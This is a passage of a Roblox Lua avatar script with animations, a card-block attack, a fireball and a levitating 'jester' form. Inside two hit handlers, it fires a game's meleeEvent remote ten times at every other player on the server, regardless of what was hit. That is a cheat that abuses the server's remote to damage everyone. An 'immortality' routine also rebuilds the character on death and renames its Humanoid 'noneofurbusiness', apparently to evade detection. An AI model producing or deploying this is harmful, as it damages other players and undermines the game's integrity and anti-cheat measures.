RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Falling2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
elseif position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
elseif position == "Walking2" and attacking == true and appi == true then
change = .8
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)), 0.3)
end
end
end)()
blockcard = Instance.new("Part",Torso)
blockcard.Material = "Neon"
blockcard.Transparency = 1
blockcard.BrickColor = BrickColor.new("White")
blockcard.Size = Vector3.new(8, 13, 0.3)
blockcard.CFrame = Root.CFrame * CFrame.new(0,2,-5)
blockcard.Anchored = true
boosh.Parent = blockcard
SOUND(blockcard,236989198,6,false,1)
ace = aces[math.random(1,#aces)]
acer = Instance.new("Decal",blockcard)
acer.Texture = "rbxassetid://"..ace
acer.Transparency = 1
acer.Face = "Front"
ace2 = acer:Clone()
ace2.Parent = blockcard
ace2.Face = "Back"
coroutine.wrap(function()
for i = 1, 20 do
blockcard.Transparency = blockcard.Transparency - 0.05
acer.Transparency = blockcard.Transparency
ace2.Transparency = blockcard.Transparency
swait()
end
clickallowance = true
end)()
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
coroutine.wrap(function()
while blocking do
if not blockedoff then
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,-.2, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),.3)
blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5)
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0)*CFrame.Angles(0,0,0),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
end
swait()
end
end)()
wait(1)
mouse.Button1Down:connect(function()
if throwing then return end
if not clickallowance then return end
clickallowance = false
blockedoff = true
ws = 0
for i = 1, 15 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(25), math.rad(0)), 0.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
swait()
end
boosh:Play()
hitdebounce = false
blockcard.Touched:connect(function(hit)
if hit.Parent:IsA("Part") then
elseif hit.Parent:IsA("SpecialMesh") then
elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
elseif hit.Parent:findFirstChildOfClass("Humanoid") then
for i,v in pairs(hit.Parent:GetChildren()) do
Slachtoffer = v.Parent:FindFirstChildOfClass("Humanoid")
if hitdebounce then return end
hitdebounce = true
vel = Instance.new("BodyVelocity",hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
if Slachtoffer.RigType == Enum.HumanoidRigType.R15 then
tors = hit.Parent:FindFirstChild("UpperTorso")
else
tors = hit.Parent:FindFirstChild("Torso")
end
vel.velocity = CFrame.new(Root.Position,tors.Position).lookVector*120
removeuseless:AddItem(vel,.1)
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
end
end
end)
for i = 1, 10 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-20), math.rad(0)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-20), math.rad(4)), 0.3)
blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,0-1)
swait()
end
for i = 1, 10 do
blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,0+1)
swait()
end
hitdebounce = true
ws = 10
clickallowance = true
blockedoff = false
end)
end
end
end)


mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='f' then
if debounce then return end
if notallowedtransform then return end
debounce = true
if levitate then
levitate = false
mjester.VertexColor = Vector3.new(1, 1, 1)
glow.Transparency = 1
blastwave = Instance.new("Part",Torso)
blastwave.CFrame = Torso.CFrame
blastwave.Anchored = true
blastwave.Material = "Neon"
blastwave.CanCollide = false
blastwave.Shape = "Ball"
blastwave.Size = Vector3.new(3,3,3)
coroutine.wrap(function()
for i = 1, 20 do
levitatewave.Transparency = levitatewave.Transparency + 0.05
levitatewave2.Transparency = levitatewave2.Transparency + 0.05
blastwave.Size = blastwave.Size + Vector3.new(2,2,2)
blastwave.Transparency = blastwave.Transparency + 0.05
swait()
end
blastwave:Remove()
levitatewave2:Remove()
levitatewave:Remove()
end)()
ws = 10
notallowedtransform = true
attacking = true
coroutine.wrap(function()
for i = 1, 10 do
for i,v in pairs(LeftArm:GetChildren()) do if v.Name == lmagic.Name then
v.Transparency = v.Transparency + 0.1
end
end
for i,v in pairs(RightArm:GetChildren()) do if v.Name == rmagic.Name then
v.Transparency = v.Transparency + 0.1
end
end
wait()
end
end)()
doomtheme.SoundId = "rbxassetid://1843358057"
jesterWeld.C0 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
wait(0.000001)
jesterWeld.C0 = jester.CFrame:inverse() * Head.CFrame * CFrame.new(0,-.3,0) * CFrame.Angles(math.rad(0),math.rad(90),0)
mjester.Scale = Vector3.new(1.1, 1.1, 1.1)
mjester.MeshId,mjester.TextureId = 'rbxassetid://1241662062','rbxassetid://1241662395'

mMask.Scale = Vector3.new(0.13, 0.13, 0.1)
mMask.MeshId,mMask.TextureId = 'http://www.roblox.com/asset/?id=5158270','http://www.roblox.com/asset/?id=9543585'
maskweld.C0 = CFrame.new(0,0,0)*CFrame.Angles(0,0,0)
wait(0.000001)
maskweld.C0 = CFrame.new(0,-.555,0) * CFrame.Angles(math.rad(90),0,0)

eyo1 = Instance.new("Part",Head)
eyo1.BrickColor = BrickColor.new("White")
eyo1.Material = "Neon"
eyo1.Shape = "Ball"
eyo1.Name = "eyo1"
eyo1.CanCollide = false
eyo1.Size = Vector3.new(0.33, 0.33, 0.33)
eyo1weld = weldBetween(eyo1,Head)
eyo1weld.C0 = CFrame.new(.215,-.05,.52)

light = Instance.new("PointLight", eyo1)
light.Color = Color3.new(1,1,1)
light.Range = 3
light.Brightness = 4
light.Enabled = true

eyo2 = Instance.new("Part",Head)
eyo2.BrickColor = BrickColor.new("White")
eyo2.Material = "Neon"
eyo2.Shape = "Ball"
eyo2.Name = "eyo2"
eyo2.CanCollide = false
eyo2.Size = Vector3.new(0.33, 0.33, 0.33)
eyo2weld = weldBetween(eyo2,Head)
eyo2weld.C0 = CFrame.new(-.215,-.05,.52)

light2 = Instance.new("PointLight", eyo2)
light2.Color = Color3.new(1,1,1)
light2.Range = 3
light2.Brightness = 4
light2.Enabled = true

Character.Shirt.ShirtTemplate = "rbxassetid://676428254"
Character.Pants.PantsTemplate = "rbxassetid://676428351"
hum.HipHeight = 0
ws = 10
debounce = false
attacking = false
coroutine.wrap(function()
wait(3)
notallowedtransform = false
end)()
else
ws = 50
notallowedtransform = true
levitate = true
ws = 50
glow.Transparency = 0
eyo1:Remove()
eyo2:Remove()
coroutine.wrap(function()
while levitate do
for i,v in pairs(Head:GetChildren()) do
if v.Name == "eyo1" or v.Name == "eyo2" then
v:Remove()
end
end
wait()
end
end)()
mnb = 0
levitatewave = Instance.new("Part", Torso)
levitatewave.Size = Vector3.new(1,1,1)
levitatewave.CanCollide = false
levitatewave.Anchored = true
levitatewave.Transparency = .5
levitatewave.BrickColor = BrickColor.new("Really black")
levitatewave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-5,0)
levitatewavemesh = Instance.new("SpecialMesh", levitatewave)
levitatewavemesh.Scale = Vector3.new(2.5,.3,2.5)
levitatewavemesh.MeshId = "rbxassetid://20329976"
levitatewave2 = Instance.new("Part", Torso)
levitatewave2.Size = Vector3.new(1,1,1)
levitatewave2.CanCollide = false
levitatewave2.Anchored = true
levitatewave2.Transparency = .5
levitatewave2.BrickColor = BrickColor.new("Really red")
levitatewave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-5,0)
levitatewavemesh2 = Instance.new("SpecialMesh", levitatewave2)
levitatewavemesh2.Scale = Vector3.new(2,.4,2)
levitatewavemesh2.MeshId = "rbxassetid://20329976"
blastwave = Instance.new("Part",Torso)
blastwave.CFrame = Torso.CFrame
blastwave.Anchored = true
blastwave.Material = "Neon"
blastwave.CanCollide = false
blastwave.Shape = "Ball"
blastwave.Size = Vector3.new(3,3,3)
coroutine.wrap(function()
for i = 1, 20 do
blastwave.Size = blastwave.Size + Vector3.new(2,2,2)
blastwave.Transparency = blastwave.Transparency + 0.05
swait()
end
blastwave:Remove()
end)()
coroutine.wrap(function()
while levitate do
mnb = mnb + 15
levitatewave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-6 + .5 * math.sin(sine/9),0) * CFrame.Angles(0,math.rad(mnb),0)
levitatewave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-6 + .5 * math.sin(sine/9),0) * CFrame.Angles(0,math.rad(mnb),0)
colors = colortable[math.random(1,#colortable)]
lmagic = Instance.new("Part",LeftArm)
lmagic.Material = "Neon"
lmagic.CanCollide = false
lmagic.Anchored = true
lmagic.BrickColor = BrickColor.new(colors)
lmagic.Size = Vector3.new(1,1,1)
lmagic.CFrame = leftlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(lmagic,2)
rmagic = Instance.new("Part",RightArm)
rmagic.Material = "Neon"
rmagic.CanCollide = false
rmagic.Anchored = true
rmagic.BrickColor = BrickColor.new(colors)
rmagic.Size = Vector3.new(1,1,1)
rmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(rmagic,2)
for i,v in pairs(LeftArm:GetChildren()) do if v.Name == lmagic.Name then
v.Transparency = v.Transparency + 0.05
end
end
for i,v in pairs(RightArm:GetChildren()) do if v.Name == rmagic.Name then
v.Transparency = v.Transparency + 0.05
end
end
swait()
end
end)()
framee = Instance.new("Frame")
framee.Parent = screenGui
framee.Position = UDim2.new(0, 8, 0, -500)
framee.Size = UDim2.new(100000000,10000000,10000000,10000000)
framee.BackgroundColor3 = BrickColor.new("White").Color
framee.BackgroundTransparency = 0
coroutine.wrap(function()
wait(.2)
for i = 1, 40 do
hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-0,0))
framee.BackgroundTransparency = framee.BackgroundTransparency + 0.025
swait()
end
hum.CameraOffset = Vector3.new(0,0,0)
framee:Remove()
end)()
doomtheme.SoundId = "rbxassetid://1382488262"
doomtheme:Play()
doomtheme.Volume = 2
doomtheme.TimePosition = 20.7
jesterWeld.C0 = jesterWeld.C0 * CFrame.new(.3,-.3,0) * CFrame.Angles(math.rad(0),math.rad(-90),0)
mjester.MeshId = "rbxassetid://193760002"
mjester.TextureId = "rbxassetid://379225327"
mjester.VertexColor = Vector3.new(1, 0, 0)
Character.Shirt.ShirtTemplate = "rbxassetid://238537827"
Character.Pants.PantsTemplate = "rbxassetid://486031443"
maskweld.C0 = maskweld.C0 * CFrame.new(0,.55,-.5) * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(0))
mMask.MeshId = "rbxassetid://13520257"
mMask.Scale = Vector3.new(1.1, 1, 1)
mMask.TextureId = "rbxassetid://13520260"
eyo1:Remove()
eyo2:Remove()
coroutine.wrap(function()
while levitate do
hum.HipHeight = 3 - .5 * math.sin(sine/9)
swait()
end
end)()
attacking = false
debounce = false
coroutine.wrap(function()
wait(3)
notallowedtransform = false
end)()
end
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='.' then
hum.Parent:BreakJoints()
end
end)

checks1 = coroutine.wrap(function() -------Checks
while true do
if Root.Velocity.y > 1 and levitate == false then
position = "Jump"
elseif Root.Velocity.y < -1 and levitate == false then
position = "Falling"
elseif Root.Velocity.Magnitude < 2 and running == false and not levitate then
position = "Idle"
elseif Root.Velocity.Magnitude < 2 and running == false then
position = "Idle2"
elseif Root.Velocity.Magnitude < 20 and running == false and levitate == false then
position = "Walking"
elseif Root.Velocity.Magnitude > 20 and running == false and levitate then
position = "Walking2"
elseif Root.Velocity.Magnitude > 20 and levitate == false then
position = "Running"
else
end
wait()
end
end)
checks1()

function ray(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
	return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
end

function ray2(StartPos, EndPos, Distance, Ignore)
local DIRECTION = CFrame.new(StartPos,EndPos).lookVector
return ray(StartPos, DIRECTION, Distance, Ignore)
end

OrgnC0 = Neck.C0
local movelimbs = coroutine.wrap(function()
while RunSrv.RenderStepped:wait() do
TrsoLV = Torso.CFrame.lookVector
Dist = nil
Diff = nil
if not MseGuide then
print("Failed to recognize")
else
local _, Point = Workspace:FindPartOnRay(Ray.new(Head.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
Dist = (Head.CFrame.p-Point).magnitude
Diff = Head.CFrame.Y-Point.Y
local _, Point2 = Workspace:FindPartOnRay(Ray.new(LeftArm.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
Dist2 = (LeftArm.CFrame.p-Point).magnitude
Diff2 = LeftArm.CFrame.Y-Point.Y
HEADLERP.C0 = CFrame.new(0, -1.5, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
Neck.C0 = Neck.C0:lerp(OrgnC0*CFrame.Angles((math.tan(Diff/Dist)*1), 0, (((Head.CFrame.p-Point).Unit):Cross(Torso.CFrame.lookVector)).Y*1), .1)
end
end
end)
movelimbs()
immortal = {}
for i,v in pairs(Character:GetDescendants()) do
	if v:IsA("BasePart") and v.Name ~= "lmagic" and v.Name ~= "rmagic" then
		if v ~= Root and v ~= Torso and v ~= Head and v ~= RightArm and v ~= LeftArm and v ~= RightLeg and v.Name ~= "lmagic" and v.Name ~= "rmagic" and v ~= LeftLeg then
			v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		end
		table.insert(immortal,{v,v.Parent,v.Material,v.Color,v.Transparency})
	elseif v:IsA("JointInstance") then
		table.insert(immortal,{v,v.Parent,nil,nil,nil})
	end
end
for e = 1, #immortal do
	if immortal[e] ~= nil then
		local STUFF = immortal[e]
		local PART = STUFF[1]
		local PARENT = STUFF[2]
		local MATERIAL = STUFF[3]
		local COLOR = STUFF[4]
		local TRANSPARENCY = STUFF[5]
if levitate then
		if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= eyo1 and PART.Name ~= eyo2 and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
			PART.Material = MATERIAL
			PART.Color = COLOR
			PART.Transparency = TRANSPARENCY
		end
		PART.AncestryChanged:connect(function()
			PART.Parent = PARENT
		end)
else
		if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
			PART.Material = MATERIAL
			PART.Color = COLOR
			PART.Transparency = TRANSPARENCY
		end
		PART.AncestryChanged:connect(function()
			PART.Parent = PARENT
		end)
end
	end
end
function immortality()
	for e = 1, #immortal do
		if immortal[e] ~= nil then
			local STUFF = immortal[e]
			local PART = STUFF[1]
			local PARENT = STUFF[2]
			local MATERIAL = STUFF[3]
			local COLOR = STUFF[4]
			local TRANSPARENCY = STUFF[5]
			if PART.ClassName == "Part" and PART == Root then
				PART.Material = MATERIAL
				PART.Color = COLOR
				PART.Transparency = TRANSPARENCY
			end
			if PART.Parent ~= PARENT then
				hum:Remove()
				PART.Parent = PARENT
				hum = Instance.new("Humanoid",Character)
if levitate then
eyo1:Remove()
eyo2:Remove()
end
                                hum.Name = "noneofurbusiness"
			end
		end
	end
end
coroutine.wrap(function()
while true do
if hum.Health < .1 then
deadsound = Instance.new("Sound", Torso)
deadsound.Volume = 6
deadsound.SoundId = "rbxassetid://1411352723"
deadsound:Play()
immortality()
end
wait()
end
end)()

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='g' then
if not levitate then return end
if debounce then return end
debounce = true
attacking = true
FireBall:Play()
ws = 15
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
for i = 1, 15 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
swait()
end
local swoosh = Instance.new("Part",Torso)
swoosh.Name = "swoosh"
swoosh.CFrame = rightlocation.CFrame * CFrame.new(0,0,0)
swoosh.Size = Vector3.new(1.7,1.7,1.7)
swoosh.Shape = "Ball"
swoosh.Material = "Neon"
swoosh.BrickColor = BrickColor.new("Really black")
swoosh.CanCollide = false
swoosh.Touched:connect(function(hit)
if hit.Parent:IsA("Part") then
elseif hit.Parent:IsA("SpecialMesh") then
elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
elseif hit.Parent:findFirstChildOfClass("Humanoid") then
Slachtoffer = hit.Parent:findFirstChildOfClass("Humanoid")
if Slachtoffer.Health < 1 then return end
if damagedebounce == true then return end
damagedebounce = true
swoosh:Remove()
explosion = Instance.new("Part",LeftArm)
explosion.CFrame = hit.CFrame
explosion.Anchored = true
explosion.CanCollide = false
explosion.Name = "explo"
explosion.Shape = "Ball"
explosion.BrickColor = BrickColor.new("Really black")
explosion.Material = "Neon"
removeuseless:AddItem(explosion,1.5)
vel = Instance.new("BodyVelocity",hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(swoosh.Position,torso.Position).lookVector*60
removeuseless:AddItem(vel,.1)
SOUND(explosion,472579737,6,false,3)
coroutine.wrap(function()
if firsttime2 then return end
firsttime2 = true
while true do
for i,v in pairs(LeftArm:GetChildren()) do
if v.Name == "explo" then
v.Size = v.Size + Vector3.new(2.5,2.5,2.5)
v.Transparency = v.Transparency + .05
end
end
for i,v in pairs(LeftArm:GetChildren()) do
if v.Name == "shock" then
v.Transparency = v.Transparency + .05
end
end
for i,v in pairs(LeftArm:GetChildren()) do
if v.Name == "shock2" then
v.Transparency = v.Transparency + .05
end
end
swait()
end
end)()
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
wait(.1)
damagedebounce = false
end
end)
coroutine.wrap(function()
if firsttime then return end
firsttime = true
while wait() do
for i,v in pairs(Torso:GetChildren()) do
if v.Name == "swoosh" then
magiccc = Instance.new("Part",RightArm)
magiccc.Material = "Neon"
magiccc.CanCollide = false
magiccc.Anchored = true
magiccc.BrickColor = BrickColor.new(colors)
magiccc.Size = Vector3.new(1.5,1.5,1.5)
magiccc.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(magiccc,2)
end
end
end
end)()
bov = Instance.new("BodyVelocity",swoosh)
bov.maxForce = Vector3.new(99999,99999,99999)
swoosh.CFrame = CFrame.new(swoosh.Position,mouse.Hit.p)
bov.velocity = swoosh.CFrame.lookVector*120
removeuseless:AddItem(swoosh,4)
for i = 1, 15 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.2,1,.5) * CFrame.Angles(math.rad(-90),math.rad(-25),math.rad(0)), 0.5)
swait()
end
ws = 50
removeuseless:AddItem(g1,0.01)
debounce = false
attacking = false
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='h' then
if not levitate then return end
if debounce then return end
debounce = true
attacking = true
ws = 0
appi = true
coroutine.wrap(function()
while appi do
swait()
if Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle3"
end
end
end)()
coroutine.wrap(function()
while appi do
swait()
settime = 0.05
sine = sine + change
if position == "Idle3" and attacking == true and appi == true then
change = .4
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
end
end
end)()
coroutine.wrap(function()
for i = 1, 20 do
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(0,math.rad(50),0),.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.1,1.3,1.1) * CFrame.Angles(math.rad(180),math.rad(-50),math.rad(0)), 0.3)
swait()
end
end)()
SOUND(LeftArm,1982011510,8,false,15)
blackhole={}
orbzfade={}
xz = 0
for i = 1, 220 do
xz = xz + .009
bigrmagic = Instance.new("Part",RightArm)
bigrmagic.Material = "Neon"
bigrmagic.CanCollide = false
bigrmagic.Anchored = true
bigrmagic.BrickColor = BrickColor.new(colors)
bigrmagic.Size = Vector3.new(xz,xz,xz)
bigrmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(bigrmagic,1)
orbz = Instance.new("Part", Torso)
orbz.Material = "Neon"
orbz.BrickColor = BrickColor.new(colors)
orbz.Size = Vector3.new(2,2,2)
orbz.Anchored = true
orbz.CanCollide = false
removeuseless:AddItem(orbz,1)
orbz.CFrame = rightlocation.CFrame * CFrame.new(math.random(-25,25),math.random(-25,25),math.random(-25,25)) * CFrame.Angles(math.rad(-180,180),math.rad(-180,180),math.rad(-180,180))
table.insert(blackhole,orbz)
table.insert(orbzfade,orbz)
for i,v in pairs(blackhole) do
v.Size = v.Size - Vector3.new(.1,.1,.1)
v.CFrame = v.CFrame:lerp(CFrame.new(rightlocation.Position),.09)
end
for i,v in pairs(orbzfade) do
v.Transparency = v.Transparency + 0.025
end
swait()
end
coroutine.wrap(function()
for i = 1, 10 do
for i,v in pairs(blackhole) do
v.Size = v.Size + Vector3.new(.5,.5,.5)
v.Transparency = v.Transparency + .1
end
swait()
end
for i,v in pairs(blackhole) do
v:Remove()
end
clean()
end)()
charging = true
coroutine.wrap(function()
while charging do
bigrmagic = Instance.new("Part",RightArm)
bigrmagic.Material = "Neon"
bigrmagic.CanCollide = false
bigrmagic.Anchored = true
bigrmagic.BrickColor = BrickColor.new(colors)
bigrmagic.Size = Vector3.new(xz,xz,xz)
bigrmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
removeuseless:AddItem(bigrmagic,.2)
swait()
end
end)()
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
BigFireBall:Play()
for i = 1, 15 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
swait()
end
coroutine.wrap(function()
for i = 1, 15 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(10),math.rad(15),math.rad(0)),.5)
RIGHTARMLERP.C1 = CFrame.new(0,0,0)
